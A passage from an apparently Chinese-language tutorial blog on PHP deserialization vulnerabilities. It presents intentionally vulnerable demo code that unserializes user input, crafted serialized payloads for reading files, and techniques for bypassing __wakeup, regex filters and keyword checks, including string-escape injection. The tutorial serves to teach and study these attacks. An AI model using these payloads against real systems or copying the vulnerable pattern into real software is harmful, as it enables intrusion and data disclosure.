class="hljs-variable">$a</span>=<span class="hljs-number">6</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;string&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;string&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>;<br><br></code></pre></td></tr></table></figure><h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">6</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;string&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br><br><br></code></pre></td></tr></table></figure><h4 id="一个实例"><a href="#一个实例" class="headerlink" title="一个实例"></a>一个实例</h4><p>现在开始这个小实验，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test9.php&#x27;</span>;<br><span class="hljs-variable">$fileobj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fileclass</span>();<br><span class="hljs-variable">$fileobj</span>-&gt;filename = <span class="hljs-string">&#x27;hello.txt&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$fileobj</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test8.php</span><br></code></pre></td></tr></table></figure><p>我们先访问test8.php，结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fileclass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;error.log&#x27;</span>;<br>    <span class="hljs-comment">//当对象被作为一个字符串会读取这个文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//class data</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//允许对象作为一个字符串输出上面的data</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;user &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//用户可控</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br><span class="hljs-comment">//输出__toString</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test9.php</span><br></code></pre></td></tr></table></figure><p>接下来我们出发反序列化漏洞，获取hello.txt的内容：<br>构造url：<code>http://localhost/test9.php?usr_serialized=O:9:%22fileclass%22:1:&#123;s:8:%22filename%22;s:9:%22hello.txt%22;&#125;</code><br>访问：<br><img src="https://img-blog.csdnimg.cn/20190323122744234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220321210523070.png" alt="image-20220321210523070"></p><h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><p>PHP中把以<strong>两个下划线</strong><code>__</code>开头的方法称为<strong>魔术方法</strong>(Magic methods)<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">PHP官方——魔术方法</a><br><a href="https://www.cnblogs.com/wwlww/p/8413418.html">PHP中16 个魔术方法详解</a></p><p>类可能会包含一些特殊的函数：magic函数，这些函数在某些情况下会<strong>自动调用</strong>。</p><p>serialize() 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作。</p><p><code>__construct</code>：构造函数，当一个对象<strong>创建</strong>时调用</p><p><code>__destruct</code>：析构函数，当一个对象<strong>被销毁</strong>时调用</p><p><code>__toString</code>：当一个对象<strong>被当作一个字符串</strong>时使用</p><p><code>__sleep</code>：在对象<strong>序列化</strong>的时候调用</p><p><code>__wakeup</code>：对象重新醒来，即<strong>由二进制串重新组成一个对象</strong>的时候（在一个对象被<strong>反序列化</strong>时调用）</p><p>从序列化到反序列化这几个函数的执行过程是：<br><code>__construct()</code> -&gt;<code>__sleep()</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code></p><h4 id="补充几个用例"><a href="#补充几个用例" class="headerlink" title="补充几个用例"></a>补充几个用例</h4><p><img src="D:/mdimage/1344396-20200929174704829-1177244300.png" alt="img"> </p><h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p><p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h3><h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="(CVE-2016-7124)"></a>(CVE-2016-7124)</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">版本：<br> PHP5 &lt; 5.6.25<br> PHP7 &lt; 7.0.10<br></code></pre></td></tr></table></figure><p>利用方式：<code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p><p>对于下面这样一个自定义类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;666&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>666</code></p><p>而把对象属性个数的值增大执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>abc</code></p><h4 id="PHP-Bug-81151-2021-06-17"><a href="#PHP-Bug-81151-2021-06-17" class="headerlink" title="PHP Bug 81151(2021-06-17)"></a>PHP Bug 81151(2021-06-17)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;construct&quot;</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;E&quot;:0:&#123;&#125;destruct&#x27;</span>);<span class="hljs-comment">//正常的全触发</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>);<span class="hljs-comment">//不触发wake up</span><br><br><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221015210753313.png" alt="image-20221015210753313"> </p><p>这样不会触发construct,wake up</p><h4 id="PHP-Bug-81153-2021-06-17"><a href="#PHP-Bug-81153-2021-06-17" class="headerlink" title="PHP Bug 81153(2021-06-17)"></a>PHP Bug 81153(2021-06-17)</h4><p>官方是这样描述的<br> bad unserialize string makes <code>__wakeup</code> ineffective.</p><h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p><p>利用加号绕过（注意在url里传参时+要编码为%2B）<br><code>serialize(array(a ) ) ; / / a));//a));//a</code>为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a.PHP_EOL;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">match</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you lose!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br><span class="hljs-comment">// +号绕过</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-keyword">match</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-comment">// serialize(array($a));</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b= &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br></code></pre></td></tr></table></figure><p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;%00*%00a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;%00test%00b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;def&quot;</span>;&#125;<br>可以写成<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;S:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;\00*\00\61&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;%00test%00b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;def&quot;</span>;&#125;<br>表示字符类型的s大写时，会被当成<span class="hljs-number">16</span>进制解析。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>; <br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123; <br><br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;admin&#x27;</span>; <br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <br><br><span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>; <br><br>&#125; <br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;username&#x27;</span>)!==False)&#123; <br><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;你绕不过！！&quot;</span>.PHP_EOL); <br><br>&#125;<br><br><span class="hljs-keyword">else</span>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>; <br><br>&#125; <br><br>&#125;<br><br><span class="hljs-comment">// 未作处理前 </span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>; <br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>); <br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>); <br><br><span class="hljs-comment">// 做处理后 \75是u的16进制 </span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>; <br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>); <br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><h4 id="情况1：过滤后字符变多"><a href="#情况1：过滤后字符变多" class="headerlink" title="情况1：过滤后字符变多"></a>情况1：过滤后字符变多</h4><p>首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$age</span> = <span class="hljs-string">&quot;I am 11&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$age</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;反序列化字符串：&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;过滤后:&quot;</span>;<br><span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;此时，age=<span class="hljs-subst">$new</span>[1]&quot;</span>;<br></code></pre></td></tr></table></figure><p>正常情况,传入<code>name=mao</code></p><p><img src="https://img-blog.csdnimg.cn/20210203104830625.png#pic_center" alt="在这里插入图片描述"> </p><p>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p><p><img src="https://img-blog.csdnimg.cn/20210203104840221.png#pic_center" alt="在这里插入图片描述"> </p><p>首先来看看结果，再来讲解</p><p><img src="https://img-blog.csdnimg.cn/20210203104847637.png#pic_center" alt="在这里插入图片描述"> </p><p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code><br><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符<br>由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code><br>最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程</p><h4 id="情况2：过滤后字符变少"><a href="#情况2：过滤后字符变少" class="headerlink" title="情况2：过滤后字符变少"></a>情况2：过滤后字符变少</h4><p>老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 